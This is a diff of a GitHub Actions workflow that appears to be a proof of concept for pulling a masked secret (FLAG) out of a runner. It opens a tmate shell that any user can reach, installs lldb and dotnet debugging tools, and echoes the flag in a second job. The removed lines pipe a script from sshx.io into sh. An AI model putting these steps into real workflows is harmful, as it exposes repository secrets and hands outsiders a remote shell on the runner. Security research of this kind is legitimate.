@@ -1,91 +1,46 @@
-name: ssh + steps
+name: LOTP POC - GHA debug
 on:
   workflow_dispatch:
 
+permissions:
+  contents: read
+
 jobs:
-  prep:
+  classic-env:
     runs-on: ubuntu-latest
+    outputs:
+      flag: ${{ steps.output.unhackable.FLAG }}
     steps:
-      - run: |
-          curl -sSf https://sshx.io/get | sh -s run &
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
-      - run: sleep 5
+      - uses: actions/checkout@v4
+        with:
+          repository: actions/runner
+      - id: unhackable
+        run: echo "FLAG=${{ secrets.FLAG }}" >> $GITHUB_OUTPUT
+      - name: Install netcoredbg
+        run: |
+          sudo apt install lldb
+          dotnet tool install --global dotnet-debugger-extensions
+          dotnet-debugger-extensions install --accept-license-agreement
+          sudo cp ~/.dotnet /root/ -r
+          sudo cp ~/.lldbinit /root/
+      - name: Setup tmate session
+        uses: mxschmitt/action-tmate@v3
+        with:
+          detached: true
+          limit-access-to-actor: false
+      - name: wait
+        run: |
+          while [[ ! -f "/tmp/bacon" ]]; do echo "waiting"; sleep 5; done;
+          echo "Done"
+      - run: sleep 5
+      - run: sleep 5
+      - run: sleep 5
+
+  second:
+    runs-on: ubuntu-latest
+    needs: classic-env
+    steps:
+      - uses: actions/checkout@v4
+      - name: Verify Mask
+        run: |
+          echo ${{ needs.classic-env.output.flag }}
